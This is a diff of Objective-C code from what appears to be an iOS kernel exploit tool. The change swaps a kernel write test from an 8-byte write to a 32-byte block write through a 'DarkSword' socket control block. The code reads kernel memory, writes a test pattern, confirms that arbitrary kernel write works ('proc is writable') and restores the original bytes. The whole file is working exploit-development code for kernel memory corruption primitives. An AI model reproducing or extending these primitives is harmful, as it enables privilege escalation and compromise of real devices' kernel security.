@@ -1617,32 +1617,39 @@ cleanup:
             scopeNote(r, @"  victims intact — OOB did not reach them this run (heap layout)");
         }
 
-        // ---- KRW proc write test (type 0x21) via krw_zone_write_qword ----
-        [r appendString:@"\n--- KRW proc write test (type 0x21, krw_zone_write_qword) ---\n"];
+        // ---- KRW write test via krw_zone_write_block (proven DarkSword path) ----
+        [r appendString:@"\n--- KRW write test (krw_zone_write_block) ---\n"];
         {
             extern uint64_t darksword_rw_socket_pcb(void);
             uint64_t pcb = darksword_rw_socket_pcb();
             if (pcb && gPrimitives.kreadbuf) {
                 scopeNote(r, [NSString stringWithFormat:@"  darksword pcb = 0x%016llx", pcb]);
-                uint64_t orig = 0;
-                gPrimitives.kreadbuf(pcb + 0x150, &orig, 8);
+                // Read original 32-byte block at pcb+0x150
+                uint8_t orig[32] = {0};
+                gPrimitives.kreadbuf(pcb + 0x150, orig, 32);
                 scopeNote(r, [NSString stringWithFormat:
-                    @"  pcb+0x150 (chksum) read: 0x%016llx", orig]);
-                uint64_t testVal = 0x1122334455667788ULL;
-                krw_zone_verdict v = krw_zone_write_qword(pcb + 0x150, testVal, pcb, 0x200);
-                scopeNote(r, [NSString stringWithFormat:@"  write verdict=%d", (int)v]);
-                uint64_t readBack = 0;
-                gPrimitives.kreadbuf(pcb + 0x150, &readBack, 8);
+                    @"  pcb+0x150 block read: %02x %02x %02x %02x ...",
+                    orig[0], orig[1], orig[2], orig[3]]);
+                // Write test pattern via krw_zone_write_block (32-byte block write)
+                uint8_t testBlock[32];
+                memset(testBlock, 0x41, 32);
+                *(uint64_t *)testBlock = 0x1122334455667788ULL;
+                krw_zone_write_block(pcb + 0x150, testBlock);
+                // Read back
+                uint8_t readBack[32] = {0};
+                gPrimitives.kreadbuf(pcb + 0x150, readBack, 32);
                 scopeNote(r, [NSString stringWithFormat:
-                    @"  pcb+0x150 write test: wrote 0x%016llx  readback=0x%016llx",
-                    testVal, readBack]);
-                if (readBack == testVal) {
-                    scopeNote(r, @"  >>> KRW WRITE VERIFIED via krw_zone_write_qword (type 0x21 path)");
+                    @"  pcb+0x150 readback: %02x %02x %02x %02x ... (expect 88 77 66 55)",
+                    readBack[0], readBack[1], readBack[2], readBack[3]]);
+                if (*(uint64_t *)readBack == 0x1122334455667788ULL) {
+                    scopeNote(r, @"  >>> KRW WRITE VERIFIED via krw_zone_write_block!");
+                    scopeNote(r, @"  >>> type 0x21 path confirmed — proc is writable");
                 } else {
                     scopeNote(r, @"  >>> KRW write did not persist");
                 }
-                krw_zone_write_qword(pcb + 0x150, orig, pcb, 0x200);
-                scopeNote(r, @"  restored original value");
+                // Restore
+                krw_zone_write_block(pcb + 0x150, orig);
+                scopeNote(r, @"  restored original block");
             } else {
                 scopeNote(r, @"  darksword pcb or kreadbuf not available — run pe_v1 first");
             }
